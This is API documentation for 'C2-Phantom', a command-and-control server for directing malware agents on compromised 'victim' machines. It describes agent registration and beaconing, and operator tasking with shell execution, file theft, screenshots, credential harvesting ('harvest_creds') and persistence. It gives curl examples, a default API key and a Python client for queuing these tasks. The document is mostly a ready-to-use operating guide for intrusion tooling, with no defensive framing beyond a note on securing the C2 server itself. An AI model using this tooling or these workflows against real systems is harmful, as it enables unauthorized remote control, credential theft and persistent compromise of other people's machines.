# 🔌 C2-Phantom REST API Documentation

## Professional API Reference for C2 Operations

**Base URL**: `http://localhost:8080` (HTTP) | `https://localhost:443` (HTTPS)  
**API Version**: v1  
**Authentication**: API Key (Header: `X-API-Key`)

---

## 📑 Table of Contents

1. [Authentication](#authentication)
2. [Agent Endpoints](#agent-endpoints)
3. [Operator Endpoints](#operator-endpoints)
4. [Task Management](#task-management)
5. [Statistics](#statistics)
6. [Error Handling](#error-handling)
7. [Rate Limiting](#rate-limiting)
8. [Examples](#examples)

---

## 🔐 Authentication

### API Key Authentication

All operator endpoints require an API key in the request header.

**Header**:
```
X-API-Key: your-api-key-here
```

**Default API Key** (change immediately):
```
c2phantom-admin-key-change-me
```

**Generating New API Key**:
```sql
INSERT INTO operators (username, api_key, created_at)
VALUES ('your-username', 'your-secure-random-key', NOW());
```

---

## 👤 Agent Endpoints

Agent endpoints are used by compromised systems to communicate with the C2 server.

### Register Agent

Register a new agent with the C2 server.

**Endpoint**: `POST /api/v1/agents/register`  
**Authentication**: None (agent endpoint)

**Request Body**:
```json
{
  "hostname": "DESKTOP-ABC123",
  "username": "victim",
  "os": "Windows",
  "architecture": "x64",
  "pid": 5432,
  "metadata": {
    "av": "Windows Defender",
    "domain": "WORKGROUP"
  }
}
```

**Response** (200 OK):
```json
{
  "success": true,
  "agent_id": "550e8400-e29b-41d4-a716-446655440000",
  "message": "Agent registered successfully",
  "beacon_interval": 60
}
```

**cURL Example**:
```bash
curl -X POST http://localhost:8080/api/v1/agents/register \
  -H "Content-Type: application/json" \
  -d '{
    "hostname": "target-pc",
    "username": "victim",
    "os": "Windows",
    "architecture": "x64",
    "pid": 1234
  }'
```

---

### Agent Beacon

Agent checks in for new tasks.

**Endpoint**: `POST /api/v1/agents/:id/beacon`  
**Authentication**: None (agent endpoint)

**Response** (200 OK):
```json
{
  "tasks": [
    {
      "id": 1,
      "agent_id": "550e8400-e29b-41d4-a716-446655440000",
      "command": "shell",
      "arguments": "[\"whoami\"]",
      "status": "sent",
      "created_at": "2026-01-11T10:30:00Z"
    }
  ],
  "beacon_interval": 60,
  "terminate": false
}
```

**cURL Example**:
```bash
curl -X POST http://localhost:8080/api/v1/agents/550e8400-e29b-41d4-a716-446655440000/beacon
```

---

### Submit Task Results

Agent submits results from completed tasks.

**Endpoint**: `POST /api/v1/agents/:id/results`  
**Authentication**: None (agent endpoint)

**Request Body**:
```json
{
  "task_id": 1,
  "success": true,
  "output": "victim\\nDesktop-ABC123\\n",
  "error": null
}
```

**Response** (200 OK):
```json
{
  "success": true
}
```

**cURL Example**:
```bash
curl -X POST http://localhost:8080/api/v1/agents/550e8400-e29b-41d4-a716-446655440000/results \
  -H "Content-Type: application/json" \
  -d '{
    "task_id": 1,
    "success": true,
    "output": "DESKTOP-ABC123\\victim"
  }'
```

---

### Get Agent Tasks

Retrieve pending tasks for an agent.

**Endpoint**: `GET /api/v1/agents/:id/tasks`  
**Authentication**: None (agent endpoint)

**Response** (200 OK):
```json
[
  {
    "id": 1,
    "agent_id": "550e8400-e29b-41d4-a716-446655440000",
    "command": "shell",
    "arguments": "[\"whoami\"]",
    "status": "pending",
    "created_at": "2026-01-11T10:30:00Z"
  },
  {
    "id": 2,
    "agent_id": "550e8400-e29b-41d4-a716-446655440000",
    "command": "screenshot",
    "arguments": "[]",
    "status": "pending",
    "created_at": "2026-01-11T10:31:00Z"
  }
]
```

---

## 🛡️ Operator Endpoints

Operator endpoints require authentication via API key.

### List Agents

Retrieve all registered agents.

**Endpoint**: `GET /api/v1/agents`  
**Authentication**: Required  
**Query Parameters**:
- `active` (optional): `true` to show only active agents

**Response** (200 OK):
```json
[
  {
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "hostname": "DESKTOP-ABC123",
    "username": "victim",
    "os": "Windows",
    "architecture": "x64",
    "ip": "192.168.1.100",
    "pid": 5432,
    "first_seen": "2026-01-11T10:00:00Z",
    "last_seen": "2026-01-11T10:30:00Z",
    "active": true
  }
]
```

**cURL Example**:
```bash
curl http://localhost:8080/api/v1/agents \
  -H "X-API-Key: c2phantom-admin-key-change-me"
```

---

### Get Agent Details

Retrieve detailed information about a specific agent.

**Endpoint**: `GET /api/v1/agents/:id`  
**Authentication**: Required

**Response** (200 OK):
```json
{
  "id": "550e8400-e29b-41d4-a716-446655440000",
  "hostname": "DESKTOP-ABC123",
  "username": "victim",
  "os": "Windows",
  "architecture": "x64",
  "ip": "192.168.1.100",
  "pid": 5432,
  "first_seen": "2026-01-11T10:00:00Z",
  "last_seen": "2026-01-11T10:30:00Z",
  "active": true
}
```

**cURL Example**:
```bash
curl http://localhost:8080/api/v1/agents/550e8400-e29b-41d4-a716-446655440000 \
  -H "X-API-Key: c2phantom-admin-key-change-me"
```

---

### Delete Agent

Remove an agent from the database.

**Endpoint**: `DELETE /api/v1/agents/:id`  
**Authentication**: Required

**Response** (200 OK):
```json
{
  "success": true
}
```

**cURL Example**:
```bash
curl -X DELETE http://localhost:8080/api/v1/agents/550e8400-e29b-41d4-a716-446655440000 \
  -H "X-API-Key: c2phantom-admin-key-change-me"
```

---

## 📋 Task Management

### Create Task

Queue a new task for an agent.

**Endpoint**: `POST /api/v1/tasks`  
**Authentication**: Required

**Request Body**:
```json
{
  "agent_id": "550e8400-e29b-41d4-a716-446655440000",
  "command": "shell",
  "arguments": ["whoami"]
}
```

**Available Commands**:
- `shell` - Execute shell command
- `download` - Download file from agent
- `upload` - Upload file to agent
- `ls` - List directory contents
- `screenshot` - Capture screenshot
- `harvest_creds` - Harvest credentials
- `persist` - Install persistence

**Response** (200 OK):
```json
{
  "id": 1,
  "agent_id": "550e8400-e29b-41d4-a716-446655440000",
  "command": "shell",
  "arguments": "[\"whoami\"]",
  "status": "pending",
  "result": "",
  "created_at": "2026-01-11T10:30:00Z",
  "completed_at": null
}
```

**cURL Example**:
```bash
curl -X POST http://localhost:8080/api/v1/tasks \
  -H "Content-Type: application/json" \
  -H "X-API-Key: c2phantom-admin-key-change-me" \
  -d '{
    "agent_id": "550e8400-e29b-41d4-a716-446655440000",
    "command": "shell",
    "arguments": ["whoami"]
  }'
```

---

### List Tasks

Retrieve tasks with optional filtering.

**Endpoint**: `GET /api/v1/tasks`  
**Authentication**: Required  
**Query Parameters**:
- `agent_id` (optional): Filter by agent
- `status` (optional): Filter by status (`pending`, `sent`, `completed`, `failed`)

**Response** (200 OK):
```json
[
  {
    "id": 1,
    "agent_id": "550e8400-e29b-41d4-a716-446655440000",
    "command": "shell",
    "arguments": "[\"whoami\"]",
    "status": "completed",
    "result": "DESKTOP-ABC123\\victim",
    "created_at": "2026-01-11T10:30:00Z",
    "completed_at": "2026-01-11T10:31:00Z"
  }
]
```

**cURL Example**:
```bash
curl "http://localhost:8080/api/v1/tasks?agent_id=550e8400-e29b-41d4-a716-446655440000&status=completed" \
  -H "X-API-Key: c2phantom-admin-key-change-me"
```

---

### Get Task Details

Retrieve detailed information about a specific task.

**Endpoint**: `GET /api/v1/tasks/:id`  
**Authentication**: Required

**Response** (200 OK):
```json
{
  "id": 1,
  "agent_id": "550e8400-e29b-41d4-a716-446655440000",
  "command": "shell",
  "arguments": "[\"whoami\"]",
  "status": "completed",
  "result": "DESKTOP-ABC123\\victim",
  "created_at": "2026-01-11T10:30:00Z",
  "completed_at": "2026-01-11T10:31:00Z"
}
```

**cURL Example**:
```bash
curl http://localhost:8080/api/v1/tasks/1 \
  -H "X-API-Key: c2phantom-admin-key-change-me"
```

---

## 📊 Statistics

### Get Server Statistics

Retrieve real-time server statistics.

**Endpoint**: `GET /api/v1/stats`  
**Authentication**: Required

**Response** (200 OK):
```json
{
  "total_agents": 25,
  "active_agents": 18,
  "total_tasks": 157,
  "pending_tasks": 3,
  "uptime": "0s"
}
```

**cURL Example**:
```bash
curl http://localhost:8080/api/v1/stats \
  -H "X-API-Key: c2phantom-admin-key-change-me"
```

---

## 🏥 Health Check

### Server Health

Check if the server is running.

**Endpoint**: `GET /health`  
**Authentication**: None

**Response** (200 OK):
```json
{
  "status": "ok"
}
```

**cURL Example**:
```bash
curl http://localhost:8080/health
```

---

## ❌ Error Handling

### Error Response Format

All errors follow a consistent format:

```json
{
  "error": "Error message description"
}
```

### HTTP Status Codes

| Code | Meaning | Description |
|------|---------|-------------|
| 200 | OK | Request successful |
| 400 | Bad Request | Invalid request parameters |
| 401 | Unauthorized | Missing or invalid API key |
| 404 | Not Found | Resource not found |
| 500 | Internal Server Error | Server error occurred |

### Common Errors

**Missing API Key** (401):
```json
{
  "error": "Missing API key"
}
```

**Invalid API Key** (401):
```json
{
  "error": "Invalid API key"
}
```

**Agent Not Found** (404):
```json
{
  "error": "Agent not found"
}
```

**Task Not Found** (404):
```json
{
  "error": "Task not found"
}
```

---

## ⏱️ Rate Limiting

**Current Implementation**: No rate limiting (trust-based internal network)

**Recommended for Production**:
- Implement rate limiting middleware
- Suggested: 100 requests/minute per API key
- Implement exponential backoff for agents

---

## 💡 Examples

### Complete Workflow Example

```bash
# 1. List active agents
curl http://localhost:8080/api/v1/agents?active=true \
  -H "X-API-Key: c2phantom-admin-key-change-me"

# 2. Create task for agent
curl -X POST http://localhost:8080/api/v1/tasks \
  -H "Content-Type: application/json" \
  -H "X-API-Key: c2phantom-admin-key-change-me" \
  -d '{
    "agent_id": "550e8400-e29b-41d4-a716-446655440000",
    "command": "shell",
    "arguments": ["ipconfig"]
  }'

# 3. Wait for agent beacon and task execution...

# 4. Check task status
curl http://localhost:8080/api/v1/tasks/1 \
  -H "X-API-Key: c2phantom-admin-key-change-me"

# 5. View server stats
curl http://localhost:8080/api/v1/stats \
  -H "X-API-Key: c2phantom-admin-key-change-me"
```

### Python SDK Example

```python
import requests

class C2Client:
    def __init__(self, base_url, api_key):
        self.base_url = base_url
        self.headers = {"X-API-Key": api_key}
    
    def list_agents(self, active_only=True):
        params = {"active": "true"} if active_only else {}
        response = requests.get(
            f"{self.base_url}/api/v1/agents",
            headers=self.headers,
            params=params
        )
        return response.json()
    
    def create_task(self, agent_id, command, arguments):
        response = requests.post(
            f"{self.base_url}/api/v1/tasks",
            headers=self.headers,
            json={
                "agent_id": agent_id,
                "command": command,
                "arguments": arguments
            }
        )
        return response.json()

# Usage
client = C2Client("http://localhost:8080", "c2phantom-admin-key-change-me")
agents = client.list_agents()
print(f"Active agents: {len(agents)}")

# Create task
task = client.create_task(
    agent_id=agents[0]["id"],
    command="shell",
    arguments=["whoami"]
)
print(f"Task created: {task['id']}")
```

---

## 🔒 Security Best Practices

1. **Change Default API Key Immediately**
2. **Use HTTPS in Production**
3. **Implement IP Whitelisting**
4. **Enable TLS Client Authentication**
5. **Rotate API Keys Regularly**
6. **Monitor for Suspicious Activity**
7. **Use Database Connection Encryption**
8. **Implement Request Logging**

---

## 📞 Support

- **API Issues**: https://github.com/4fqr/c2-phantom/issues
- **Documentation**: https://github.com/4fqr/c2-phantom/wiki
- **Security**: security@c2phantom.local

---

*API Version: 1.0.0 | Last Updated: January 11, 2026*
